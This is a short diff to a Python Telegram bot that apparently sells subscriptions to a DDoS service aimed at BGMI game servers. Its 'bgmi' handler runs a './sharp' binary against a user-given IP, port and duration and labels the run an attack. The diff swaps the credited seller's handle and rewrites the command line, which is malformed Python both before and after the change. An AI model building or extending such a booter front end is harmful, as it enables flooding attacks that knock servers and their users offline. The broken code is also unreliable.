@@ -130,7 +130,7 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
         await update.message.reply_text("❌ You don't have an active subscription. Please contact the admin for assistance.Buy Form @LANKAxxCLOUD", reply_markup=main_menu_keyboard())
     else:
         expiration_date = users[user_id]
-        await update.message.reply_text(f"👋 Welcome {username}!\n Your subscription is active until {expiration_date}.\n This Tool is provided by @KHILADI_OP", reply_markup=main_menu_keyboard())
+        await update.message.reply_text(f"👋 Welcome {username}!\n Your subscription is active until {expiration_date}.\n This Tool is provided by @LANKAxxCLOUD", reply_markup=main_menu_keyboard())
 
 async def bgmi(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
     user_id = str(update.message.from_user.id)
@@ -156,7 +156,7 @@ async def bgmi(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
         return
 
     # Updated command to remove protocol (udp/tcp)
-    command = ['./sharp', target_ip, str(port), str(duration) 30]
+    command = ['./sharp', target_ip, str(port), str(duration) 30']
     try:
         process = subprocess.Popen(command)
         # Generate and display a unique attack ID
